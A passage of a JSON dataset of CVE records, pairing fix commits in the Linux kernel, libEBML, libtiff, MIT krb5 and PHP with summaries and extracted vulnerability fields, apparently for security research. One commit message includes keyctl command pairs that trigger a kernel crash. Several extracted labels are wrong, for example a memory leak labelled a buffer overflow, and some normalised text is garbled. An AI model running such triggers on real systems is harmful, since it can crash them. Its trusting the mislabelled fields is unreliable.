to Ben Hawkes of Google Project Zero for pointing out the\nissue.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nAcked-by: Benjamin LaHaise <bcrl@kvack.org>\nTested-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Integer overflow in the aio_setup_single_vector function in fs\/aio.c in the Linux kernel 4.0 allows local users to cause a denial of service or possibly have unspecified other impact via a large AIO iovec.  NOTE: this vulnerability exists because of a CVE-2012-6701 regression.","commit_message_1":"properly check iovec size in linus 's tree , the iovec code ha been reworked massively , but in older kernel the aio layer should be checking this before passing the request on to other layer","Vulnerability Type":"integer overflow","Attack Vector":"via a large aio iovec","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"e50293ef9775c5f1cf3fcc093037dd6a8c5684ea","cve_id":"CVE-2015-8816","cwe_id":null,"commit_message":"USB: fix invalid memory access in hub_activate()\n\nCommit 8520f38099cc (\"USB: change hub initialization sleeps to\ndelayed_work\") changed the hub_activate() routine to make part of it\nrun in a workqueue.  However, the commit failed to take a reference to\nthe usb_hub structure or to lock the hub interface while doing so.  As\na result, if a hub is plugged in and quickly unplugged before the work\nroutine can run, the routine will try to access memory that has been\ndeallocated.  Or, if the hub is unplugged while the routine is\nrunning, the memory may be deallocated while it is in active use.\n\nThis patch fixes the problem by taking a reference to the usb_hub at\nthe start of hub_activate() and releasing it at the end (when the work\nis finished), and by locking the hub interface while the work routine\nis running.  It also adds a check at the start of the routine to see\nif the hub has already been disconnected, in which nothing should be\ndone.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nReported-by: Alexandru Cornea <alexandru.cornea@intel.com>\nTested-by: Alexandru Cornea <alexandru.cornea@intel.com>\nFixes: 8520f38099cc (\"USB: change hub initialization sleeps to delayed_work\")\nCC: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The hub_activate function in drivers\/usb\/core\/hub.c in the Linux kernel before 4.3.5 does not properly maintain a hub-interface data structure, which allows physically proximate attackers to cause a denial of service (invalid memory access and system crash) or possibly have unspecified other impact by unplugging a USB hub device.","commit_message_1":"fix invalid memory access in hub_activate ( ) commit 8520f38099cc ( `` usb : change hub initialization sleep to delayed_work '' ) changed the hub_activate ( ) routine to make part of it run in a workqueue","Vulnerability Type":"invalid memory access and system crash","Attack Vector":"by unplugging a usb hub device ","Impact":"cause a denial of service ( invalid memory access and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly maintain a hub - interface data structure ","Attack Type":"local attacker"},{"commit_id":"67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3","cve_id":"CVE-2015-8812","cwe_id":null,"commit_message":"iw_cxgb3: Fix incorrectly returning error on success\n\nThe cxgb3_*_send() functions return NET_XMIT_ values, which are\npositive integers values. So don't treat positive return values\nas an error.\n\nSigned-off-by: Steve Wise <swise@opengridcomputing.com>\nSigned-off-by: Hariprasad Shenai <hariprasad@chelsio.com>\nSigned-off-by: Doug Ledford <dledford@redhat.com>","summary":"drivers\/infiniband\/hw\/cxgb3\/iwch_cm.c in the Linux kernel before 4.5 does not properly identify error conditions, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free) via crafted packets.","commit_message_1":"fix incorrectly returning error on success the cxgb3_ * _send ( ) function return net_xmit_ value , which are positive integer value","Vulnerability Type":"use-after-free","Attack Vector":"via crafted packets","Impact":"execute arbitrary code or cause a denial of service ( use - after - free )","Root Cause":"does not properly identify error conditions","Attack Type":"remote attacker"},{"commit_id":"0a2d3e3644a7453b6513db2f9bc270f77943573f","cve_id":"CVE-2015-8792","cwe_id":"CWE-119","commit_message":"KaxBlockInternal: check EBML lace sizes against available buffer space","summary":"The KaxInternalBlock::ReadData function in libMatroska before 1.4.4 allows context-dependent attackers to obtain sensitive information from process heap memory via crafted EBML lacing, which triggers an invalid memory access.","commit_message_1":"kaxblockinternal : check ebml lace size against available buffer space","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted ebml lacing , which triggers an invalid memory access ","Impact":"obtain sensitive information from process heap memory","Root Cause":"caused by an invalid memory access within the KaxInternalBlock::ReadData function","Attack Type":"remote attacker"},{"commit_id":"24e5cd7c666b1ddd85619d60486db0a5481c1b90","cve_id":"CVE-2015-8791","cwe_id":"CWE-200","commit_message":"EbmlElement: don't read beyond end of buffer when reading variable length integers","summary":"The EbmlElement::ReadCodedSizeValue function in libEBML before 1.3.3 allows context-dependent attackers to obtain sensitive information from process heap memory via a crafted length value in an EBML id, which triggers an invalid memory access.","commit_message_1":"do n't read beyond end of buffer when reading variable length integer","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted length value in an ebml id , which triggers an invalid memory access","Impact":"obtain sensitive information from process heap memory","Root Cause":"caused by an invalid memory access within the EbmlElement::ReadCodedSizeValue function","Attack Type":"remote attacker"},{"commit_id":"ababb64e0c792ad2a314245233db0833ba12036b","cve_id":"CVE-2015-8790","cwe_id":"CWE-200","commit_message":"EbmlUnicodeString: don't read beyond end of string\n\nThe conversion from an UTF-8 encoded string into a wchar_t one was\nreading from beyond the end of the source buffer if the length indicated\nby a UTF-8 character's first byte exceeds the number of bytes actually\npresent afterwards.\n\nFixes the issue reported as Cisco TALOS-CAN-0036.","summary":"The EbmlUnicodeString::UpdateFromUTF8 function in libEBML before 1.3.3 allows context-dependent attackers to obtain sensitive information from process heap memory via a crafted UTF-8 string, which triggers an invalid memory access.","commit_message_1":"do n't read beyond end of string the conversion from an utf-<number> encoded string into a wchar_t one wa reading from beyond the end of the source buffer if the length indicated by a utf-<number> character 's first byte exceeds the number of byte actually present afterwards","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted utf - 8 string , which triggers an invalid memory access","Impact":"obtain sensitive information from process heap memory","Root Cause":"caused by an invalid memory access within the EbmlUnicodeString::UpdateFromUTF8 function","Attack Type":"remote attacker"},{"commit_id":"88409e2a94dd3b40ff81d08bf6d92f486d036b24","cve_id":"CVE-2015-8789","cwe_id":null,"commit_message":"EbmlMaster: propagate upper level element after infinite sized one correctly\n\nWhen the parser encountered a deeply nested element with an infinite\nsize then a following element of an upper level was not propagated\ncorrectly. Instead the element with the infinite size was added into the\nEBML element tree a second time resulting in memory access after freeing\nit and multiple attempts to free the same memory address during\ndestruction.\n\nFixes the issue reported as Cisco TALOS-CAN-0037.","summary":"Use-after-free vulnerability in the EbmlMaster::Read function in libEBML before 1.3.3 allows context-dependent attackers to have unspecified impact via a *deeply nested element with infinite size* followed by another element of an upper level in an EBML document.","commit_message_1":"propagate upper level element after infinite sized one correctly when the parser encountered a deeply nested element with an infinite size then a following element of an upper level wa not propagated correctly","Vulnerability Type":"use - after - free","Attack Vector":"via a * deeply nested element with infinite size * followed by another element of an upper level in an ebml document","Impact":"have unspecified impact","Root Cause":"caused by an use-after-free within the EbmlMaster::Read function","Attack Type":"local attacker"},{"commit_id":"94f9cd81436c85d8c3a318ba92e236ede73752fc","cve_id":"CVE-2015-8787","cwe_id":null,"commit_message":"netfilter: nf_nat_redirect: add missing NULL pointer check\n\nCommit 8b13eddfdf04cbfa561725cfc42d6868fe896f56 (\"netfilter: refactor NAT\nredirect IPv4 to use it from nf_tables\") has introduced a trivial logic\nchange which can result in the following crash.\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000030\nIP: [<ffffffffa033002d>] nf_nat_redirect_ipv4+0x2d\/0xa0 [nf_nat_redirect]\nPGD 3ba662067 PUD 3ba661067 PMD 0\nOops: 0000 [#1] SMP\nModules linked in: ipv6(E) xt_REDIRECT(E) nf_nat_redirect(E) xt_tcpudp(E) iptable_nat(E) nf_conntrack_ipv4(E) nf_defrag_ipv4(E) nf_nat_ipv4(E) nf_nat(E) nf_conntrack(E) ip_tables(E) x_tables(E) binfmt_misc(E) xfs(E) libcrc32c(E) evbug(E) evdev(E) psmouse(E) i2c_piix4(E) i2c_core(E) acpi_cpufreq(E) button(E) ext4(E) crc16(E) jbd2(E) mbcache(E) dm_mirror(E) dm_region_hash(E) dm_log(E) dm_mod(E)\nCPU: 0 PID: 2536 Comm: ip Tainted: G            E   4.1.7-15.23.amzn1.x86_64 #1\nHardware name: Xen HVM domU, BIOS 4.2.amazon 05\/06\/2015\ntask: ffff8800eb438000 ti: ffff8803ba664000 task.ti: ffff8803ba664000\n[...]\nCall Trace:\n <IRQ>\n [<ffffffffa0334065>] redirect_tg4+0x15\/0x20 [xt_REDIRECT]\n [<ffffffffa02e2e99>] ipt_do_table+0x2b9\/0x5e1 [ip_tables]\n [<ffffffffa0328045>] iptable_nat_do_chain+0x25\/0x30 [iptable_nat]\n [<ffffffffa031777d>] nf_nat_ipv4_fn+0x13d\/0x1f0 [nf_nat_ipv4]\n [<ffffffffa0328020>] ? iptable_nat_ipv4_fn+0x20\/0x20 [iptable_nat]\n [<ffffffffa031785e>] nf_nat_ipv4_in+0x2e\/0x90 [nf_nat_ipv4]\n [<ffffffffa03280a5>] iptable_nat_ipv4_in+0x15\/0x20 [iptable_nat]\n [<ffffffff81449137>] nf_iterate+0x57\/0x80\n [<ffffffff814491f7>] nf_hook_slow+0x97\/0x100\n [<ffffffff814504d4>] ip_rcv+0x314\/0x400\n\nunsigned int\nnf_nat_redirect_ipv4(struct sk_buff *skb,\n...\n{\n...\n\t\trcu_read_lock();\n\t\tindev = __in_dev_get_rcu(skb->dev);\n\t\tif (indev != NULL) {\n\t\t\tifa = indev->ifa_list;\n\t\t\tnewdst = ifa->ifa_local; <---\n\t\t}\n\t\trcu_read_unlock();\n...\n}\n\nBefore the commit, 'ifa' had been always checked before access. After the\ncommit, however, it could be accessed even if it's NULL. Interestingly,\nthis was once fixed in 2003.\n\nhttp:\/\/marc.info\/?l=netfilter-devel&m=106668497403047&w=2\n\nIn addition to the original one, we have seen the crash when packets that\nneed to be redirected somehow arrive on an interface which hasn't been\nyet fully configured.\n\nThis change just reverts the logic to the old behavior to avoid the crash.\n\nFixes: 8b13eddfdf04 (\"netfilter: refactor NAT redirect IPv4 to use it from nf_tables\")\nSigned-off-by: Munehisa Kamata <kamatam@amazon.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The nf_nat_redirect_ipv4 function in net\/netfilter\/nf_nat_redirect.c in the Linux kernel before 4.4 allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by sending certain IPv4 packets to an incompletely configured interface, a related issue to CVE-2003-1604.","commit_message_1":"nf_nat_redirect : add missing null pointer check commit 8b13eddfdf04cbfa561725cfc42d6868fe896f56 ( `` netfilter : refactor nat redirect ipv4 to use it from nf_tables '' ) ha introduced a trivial logic change which can result in the following crash","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by sending certain ipv4 packets to an incompletely configured interface , a related issue to cve - 2003 - 1604","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3ca8138f014a913f98e6ef40e939868e1e9ea876","cve_id":"CVE-2015-8785","cwe_id":"CWE-399","commit_message":"fuse: break infinite loop in fuse_fill_write_pages()\n\nI got a report about unkillable task eating CPU. Further\ninvestigation shows, that the problem is in the fuse_fill_write_pages()\nfunction. If iov's first segment has zero length, we get an infinite\nloop, because we never reach iov_iter_advance() call.\n\nFix this by calling iov_iter_advance() before repeating an attempt to\ncopy data from userspace.\n\nA similar problem is described in 124d3b7041f (\"fix writev regression:\npan hanging unkillable and un-straceable\"). If zero-length segmend\nis followed by segment with invalid address,\niov_iter_fault_in_readable() checks only first segment (zero-length),\niov_iter_copy_from_user_atomic() skips it, fails at second and\nreturns zero -> goto again without skipping zero-length segment.\n\nPatch calls iov_iter_advance() before goto again: we'll skip zero-length\nsegment at second iteraction and iov_iter_fault_in_readable() will detect\ninvalid address.\n\nSpecial thanks to Konstantin Khlebnikov, who helped a lot with the commit\ndescription.\n\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Maxim Patlasov <mpatlasov@parallels.com>\nCc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nSigned-off-by: Roman Gushchin <klamm@yandex-team.ru>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nFixes: ea9b9907b82a (\"fuse: implement perform_write\")\nCc: <stable@vger.kernel.org>","summary":"The fuse_fill_write_pages function in fs\/fuse\/file.c in the Linux kernel before 4.4 allows local users to cause a denial of service (infinite loop) via a writev system call that triggers a zero length for the first segment of an iov.","commit_message_1":"break infinite loop in fuse_fill_write_pages ( ) i got a report about unkillable task eating cpu","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a writev system call that triggers a zero length for the first segment of an iov","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b18012dae552f85dcc5c57d3bf4e997a15b1cc1c","cve_id":"CVE-2015-8784","cwe_id":"CWE-119","commit_message":"* libtiff\/tif_next.c: fix potential out-of-bound write in NeXTDecode()\ntriggered by http:\/\/lcamtuf.coredump.cx\/afl\/vulns\/libtiff5.tif\n(bugzilla #2508)","summary":"The NeXTDecode function in tif_next.c in LibTIFF allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted TIFF image, as demonstrated by libtiff5.tif.","commit_message_1":"fix potential out-of-bound write in nextdecode ( ) triggered by http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted tiff image , as demonstrated by libtiff5 . tif","Impact":"cause a denial of service ( out - of - bounds write )","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"635682a14427d241bab7bbdeebb48a7d7b91638e","cve_id":"CVE-2015-8767","cwe_id":"CWE-362","commit_message":"sctp: Prevent soft lockup when sctp_accept() is called during a timeout event\n\nA case can occur when sctp_accept() is called by the user during\na heartbeat timeout event after the 4-way handshake.  Since\nsctp_assoc_migrate() changes both assoc->base.sk and assoc->ep, the\nbh_sock_lock in sctp_generate_heartbeat_event() will be taken with\nthe listening socket but released with the new association socket.\nThe result is a deadlock on any future attempts to take the listening\nsocket lock.\n\nNote that this race can occur with other SCTP timeouts that take\nthe bh_lock_sock() in the event sctp_accept() is called.\n\n BUG: soft lockup - CPU#9 stuck for 67s! [swapper:0]\n ...\n RIP: 0010:[<ffffffff8152d48e>]  [<ffffffff8152d48e>] _spin_lock+0x1e\/0x30\n RSP: 0018:ffff880028323b20  EFLAGS: 00000206\n RAX: 0000000000000002 RBX: ffff880028323b20 RCX: 0000000000000000\n RDX: 0000000000000000 RSI: ffff880028323be0 RDI: ffff8804632c4b48\n RBP: ffffffff8100bb93 R08: 0000000000000000 R09: 0000000000000000\n R10: ffff880610662280 R11: 0000000000000100 R12: ffff880028323aa0\n R13: ffff8804383c3880 R14: ffff880028323a90 R15: ffffffff81534225\n FS:  0000000000000000(0000) GS:ffff880028320000(0000) knlGS:0000000000000000\n CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b\n CR2: 00000000006df528 CR3: 0000000001a85000 CR4: 00000000000006e0\n DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n Process swapper (pid: 0, threadinfo ffff880616b70000, task ffff880616b6cab0)\n Stack:\n ffff880028323c40 ffffffffa01c2582 ffff880614cfb020 0000000000000000\n <d> 0100000000000000 00000014383a6c44 ffff8804383c3880 ffff880614e93c00\n <d> ffff880614e93c00 0000000000000000 ffff8804632c4b00 ffff8804383c38b8\n Call Trace:\n <IRQ>\n [<ffffffffa01c2582>] ? sctp_rcv+0x492\/0xa10 [sctp]\n [<ffffffff8148c559>] ? nf_iterate+0x69\/0xb0\n [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0\/0x2d0\n [<ffffffff8148c716>] ? nf_hook_slow+0x76\/0x120\n [<ffffffff814974a0>] ? ip_local_deliver_finish+0x0\/0x2d0\n [<ffffffff8149757d>] ? ip_local_deliver_finish+0xdd\/0x2d0\n [<ffffffff81497808>] ? ip_local_deliver+0x98\/0xa0\n [<ffffffff81496ccd>] ? ip_rcv_finish+0x12d\/0x440\n [<ffffffff81497255>] ? ip_rcv+0x275\/0x350\n [<ffffffff8145cfeb>] ? __netif_receive_skb+0x4ab\/0x750\n ...\n\nWith lockdep debugging:\n\n =====================================\n [ BUG: bad unlock balance detected! ]\n -------------------------------------\n CslRx\/12087 is trying to release lock (slock-AF_INET) at:\n [<ffffffffa01bcae0>] sctp_generate_timeout_event+0x40\/0xe0 [sctp]\n but there are no more locks to release!\n\n other info that might help us debug this:\n 2 locks held by CslRx\/12087:\n #0:  (&asoc->timers[i]){+.-...}, at: [<ffffffff8108ce1f>] run_timer_softirq+0x16f\/0x3e0\n #1:  (slock-AF_INET){+.-...}, at: [<ffffffffa01bcac3>] sctp_generate_timeout_event+0x23\/0xe0 [sctp]\n\nEnsure the socket taken is also the same one that is released by\nsaving a copy of the socket before entering the timeout event\ncritical section.\n\nSigned-off-by: Karl Heiss <kheiss@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/sctp\/sm_sideeffect.c in the Linux kernel before 4.3 does not properly manage the relationship between a lock and a socket, which allows local users to cause a denial of service (deadlock) via a crafted sctp_accept call.","commit_message_1":"prevent soft lockup when sctp_accept ( ) is called during a timeout event a case can occur when sctp_accept ( ) is called by the user during a heartbeat timeout event after the <number>-way handshake","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted sctp _ accept call","Impact":"cause a denial of service ( deadlock )","Root Cause":"does not properly manage the relationship between a lock and a socket","Attack Type":"local attacker"},{"commit_id":"6058483d9fbc1b904d5ae7cfea47bfcde5c5b559","cve_id":"CVE-2015-8702","cwe_id":"CWE-20","commit_message":"Reject replies to DNS PTR requests that contain invalid characters\n\nFixes issue #1033 reported by @ping86","summary":"The DNS::GetResult function in dns.cpp in InspIRCd before 2.0.19 allows remote DNS servers to cause a denial of service (netsplit) via an invalid character in a PTR response, as demonstrated by a *032* (whitespace) character in a hostname.","commit_message_1":"reject reply to dns ptr request that contain invalid character","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an invalid character in a ptr response , as demonstrated by a * 032 * ( whitespace ) character in a hostname","Impact":"cause a denial of service ( netsplit )","Root Cause":"caused by improper validation","Attack Type":"remote attacker"},{"commit_id":"83ed75feba32e46f736fcce0d96a0445f29b96c2","cve_id":"CVE-2015-8631","cwe_id":"CWE-119","commit_message":"Fix leaks in kadmin server stubs [CVE-2015-8631]\n\nIn each kadmind server stub, initialize the client_name and\nserver_name variables, and release them in the cleanup handler.  Many\nof the stubs will otherwise leak the client and server name if\nkrb5_unparse_name() fails.  Also make sure to free the prime_arg\nvariables in rename_principal_2_svc(), or we can leak the first one if\nunparsing the second one fails.  Discovered by Simo Sorce.\n\nCVE-2015-8631:\n\nIn all versions of MIT krb5, an authenticated attacker can cause\nkadmind to leak memory by supplying a null principal name in a request\nwhich uses one.  Repeating these requests will eventually cause\nkadmind to exhaust all available memory.\n\n    CVSSv2 Vector: AV:N\/AC:L\/Au:S\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\nticket: 8343 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next\ntags: pullup","summary":"Multiple memory leaks in kadmin\/server\/server_stubs.c in kadmind in MIT Kerberos 5 (aka krb5) before 1.13.4 and 1.14.x before 1.14.1 allow remote authenticated users to cause a denial of service (memory consumption) via a request specifying a NULL principal name.","commit_message_1":"fix leak in kadmin server stub [ <cve_id> ] in each kadmind server stub , initialize the client_name and server_name variable , and release them in the cleanup handler","Vulnerability Type":"buffer overflow","Attack Vector":"via a request specifying a principal name","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by the leak of the client and server name by the rb5_unparse_name() function","Attack Type":"remote attacker"},{"commit_id":"b863de7fbf080b15e347a736fdda0a82d42f4f6b","cve_id":"CVE-2015-8630","cwe_id":null,"commit_message":"Check for null kadm5 policy name [CVE-2015-8630]\n\nIn kadm5_create_principal_3() and kadm5_modify_principal(), check for\nentry->policy being null when KADM5_POLICY is included in the mask.\n\nCVE-2015-8630:\n\nIn MIT krb5 1.12 and later, an authenticated attacker with permission\nto modify a principal entry can cause kadmind to dereference a null\npointer by supplying a null policy value but including KADM5_POLICY in\nthe mask.\n\n    CVSSv2 Vector: AV:N\/AC:H\/Au:S\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\nticket: 8342 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next\ntags: pullup","summary":"The (1) kadm5_create_principal_3 and (2) kadm5_modify_principal functions in lib\/kadm5\/srv\/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.4 and 1.14.x before 1.14.1 allow remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) by specifying KADM5_POLICY with a NULL policy name.","commit_message_1":"check for null kadm5 policy name [ <cve_id> ] in kadm5_create_principal_3 ( ) and kadm5_modify_principal ( ) , check for entry- > policy being null when kadm5_policy is included in the mask","Vulnerability Type":"NULL pointer dereference","Attack Vector":"with a NULL policy name","Impact":"cause a denial of service ( pointer dereference and crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"df17a1224a3406f57477bcd372c61e04c0e5a5bb","cve_id":"CVE-2015-8629","cwe_id":"CWE-119","commit_message":"Verify decoded kadmin C strings [CVE-2015-8629]\n\nIn xdr_nullstring(), check that the decoded string is terminated with\na zero byte and does not contain any internal zero bytes.\n\nCVE-2015-8629:\n\nIn all versions of MIT krb5, an authenticated attacker can cause\nkadmind to read beyond the end of allocated memory by sending a string\nwithout a terminating zero byte.  Information leakage may be possible\nfor an attacker with permission to modify the database.\n\n    CVSSv2 Vector: AV:N\/AC:H\/Au:S\/C:P\/I:N\/A:N\/E:POC\/RL:OF\/RC:C\n\nticket: 8341 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next\ntags: pullup","summary":"The xdr_nullstring function in lib\/kadm5\/kadm_rpc_xdr.c in kadmind in MIT Kerberos 5 (aka krb5) before 1.13.4 and 1.14.x before 1.14.1 does not verify whether '0' characters exist as expected, which allows remote authenticated users to obtain sensitive information or cause a denial of service (out-of-bounds read) via a crafted string.","commit_message_1":"verify decoded kadmin c string [ <cve_id> ] in xdr_nullstring ( ) , check that the decoded string is terminated with a zero byte and doe not contain any internal zero byte","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted string","Impact":"obtain sensitive information or cause a denial of service ( out - of","Root Cause":"does not verify whether ' 0 ' characters exist as expected","Attack Type":"remote attacker"},{"commit_id":"b101a6bbd4f2181c360bd38e7683df4a03cba83e","cve_id":"CVE-2015-8617","cwe_id":"CWE-134","commit_message":"Use format string","summary":"Format string vulnerability in the zend_throw_or_error function in Zend\/zend_execute_API.c in PHP 7.x before 7.0.1 allows remote attackers to execute arbitrary code via format string specifiers in a string that is misused as a class name, leading to incorrect error handling.","commit_message_1":"use format string","Vulnerability Type":"format string","Attack Vector":"via format string specifiers in a string that is misused as a class name , leading to incorrect error handling .","Impact":"execute arbitrary code","Root Cause":"caused by a format string error","Attack Type":"remote attacker"},{"commit_id":"5233252fce714053f0151680933571a2da9cbfb4","cve_id":"CVE-2015-8575","cwe_id":"CWE-200","commit_message":"bluetooth: Validate socket address length in sco_sock_bind().\n\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sco_sock_bind function in net\/bluetooth\/sco.c in the Linux kernel before 4.3.4 does not verify an address length, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism via a crafted application.","commit_message_1":"bluetooth : validate socket address length in sco_sock_bind ( )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory and bypass the kaslr protection mechanism","Root Cause":"does not verify an address length","Attack Type":"local attacker"},{"commit_id":"b8edbda019eeb99da8663193e224efc9d1265dc7","cve_id":"CVE-2015-8547","cwe_id":"CWE-17","commit_message":"Merge pull request #153 from elxa\/fix-op-command-crashing-core\n\nFixes a crash of the core when executing \"\/op *\" in a query.","summary":"The CoreUserInputHandler::doMode function in core\/coreuserinputhandler.cpp in Quassel 0.10.0 allows remote attackers to cause a denial of service (application crash) via the *\/op ** command in a query.","commit_message_1":"merge pull request # <number> from elxa\/fix-op-command-crashing-core fix a crash of the core when executing `` \/op * '' in a query","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via the * \/ op * * command in a query","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by a stack consumption vulnerability","Attack Type":"remote attacker"},{"commit_id":"096fe9eaea40a17e125569f9e657e34cdb6d73bd","cve_id":"CVE-2015-8539","cwe_id":"CWE-264","commit_message":"KEYS: Fix handling of stored error in a negatively instantiated user key\n\nIf a user key gets negatively instantiated, an error code is cached in the\npayload area.  A negatively instantiated key may be then be positively\ninstantiated by updating it with valid data.  However, the ->update key\ntype method must be aware that the error code may be there.\n\nThe following may be used to trigger the bug in the user key type:\n\n    keyctl request2 user user \"\" @u\n    keyctl add user user \"a\" @u\n\nwhich manifests itself as:\n\n\tBUG: unable to handle kernel paging request at 00000000ffffff8a\n\tIP: [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280 kernel\/rcu\/tree.c:3046\n\tPGD 7cc30067 PUD 0\n\tOops: 0002 [#1] SMP\n\tModules linked in:\n\tCPU: 3 PID: 2644 Comm: a.out Not tainted 4.3.0+ #49\n\tHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n\ttask: ffff88003ddea700 ti: ffff88003dd88000 task.ti: ffff88003dd88000\n\tRIP: 0010:[<ffffffff810a376f>]  [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280\n\t [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280 kernel\/rcu\/tree.c:3046\n\tRSP: 0018:ffff88003dd8bdb0  EFLAGS: 00010246\n\tRAX: 00000000ffffff82 RBX: 0000000000000000 RCX: 0000000000000001\n\tRDX: ffffffff81e3fe40 RSI: 0000000000000000 RDI: 00000000ffffff82\n\tRBP: ffff88003dd8bde0 R08: ffff88007d2d2da0 R09: 0000000000000000\n\tR10: 0000000000000000 R11: ffff88003e8073c0 R12: 00000000ffffff82\n\tR13: ffff88003dd8be68 R14: ffff88007d027600 R15: ffff88003ddea700\n\tFS:  0000000000b92880(0063) GS:ffff88007fd00000(0000) knlGS:0000000000000000\n\tCS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n\tCR2: 00000000ffffff8a CR3: 000000007cc5f000 CR4: 00000000000006e0\n\tStack:\n\t ffff88003dd8bdf0 ffffffff81160a8a 0000000000000000 00000000ffffff82\n\t ffff88003dd8be68 ffff88007d027600 ffff88003dd8bdf0 ffffffff810a39e5\n\t ffff88003dd8be20 ffffffff812a31ab ffff88007d027600 ffff88007d027620\n\tCall Trace:\n\t [<ffffffff810a39e5>] kfree_call_rcu+0x15\/0x20 kernel\/rcu\/tree.c:3136\n\t [<ffffffff812a31ab>] user_update+0x8b\/0xb0 security\/keys\/user_defined.c:129\n\t [<     inline     >] __key_update security\/keys\/key.c:730\n\t [<ffffffff8129e5c1>] key_create_or_update+0x291\/0x440 security\/keys\/key.c:908\n\t [<     inline     >] SYSC_add_key security\/keys\/keyctl.c:125\n\t [<ffffffff8129fc21>] SyS_add_key+0x101\/0x1e0 security\/keys\/keyctl.c:60\n\t [<ffffffff8185f617>] entry_SYSCALL_64_fastpath+0x12\/0x6a arch\/x86\/entry\/entry_64.S:185\n\nNote the error code (-ENOKEY) in EDX.\n\nA similar bug can be tripped by:\n\n    keyctl request2 trusted user \"\" @u\n    keyctl add trusted user \"a\" @u\n\nThis should also affect encrypted keys - but that has to be correctly\nparameterised or it will fail with EINVAL before getting to the bit that\nwill crashes.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nAcked-by: Mimi Zohar <zohar@linux.vnet.ibm.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The KEYS subsystem in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (BUG) via crafted keyctl commands that negatively instantiate a key, related to security\/keys\/encrypted-keys\/encrypted.c, security\/keys\/trusted.c, and security\/keys\/user_defined.c.","commit_message_1":"fix handling of stored error in a negatively instantiated user key if a user key get negatively instantiated , an error code is cached in the payload area","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via crafted keyctl commands that negatively instantiate a key , related to security \/ keys \/ encrypted - keys \/ encrypted . c , security \/ keys \/ trusted . c , and security \/ keys \/ user _ defined . c","Impact":"gain privileges or cause a denial of service ( bug )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"744692dc059845b2a3022119871846e74d4f6e11","cve_id":"CVE-2015-8324","cwe_id":null,"commit_message":"ext4: use ext4_get_block_write in buffer write\n\nAllocate uninitialized extent before ext4 buffer write and\nconvert the extent to initialized after io completes.\nThe purpose is to make sure an extent can only be marked\ninitialized after it has been written with new data so\nwe can safely drop the i_mutex lock in ext4 DIO read without\nexposing stale data. This helps to improve multi-thread DIO\nread performance on high-speed disks.\n\nSkip the nobh and data=journal mount cases to make things simple for now.\n\nSigned-off-by: Jiaying Zhang <jiayingz@google.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>","summary":"The ext4 implementation in the Linux kernel before 2.6.34 does not properly track the initialization of certain data structures, which allows physically proximate attackers to cause a denial of service (NULL pointer dereference and panic) via a crafted USB device, related to the 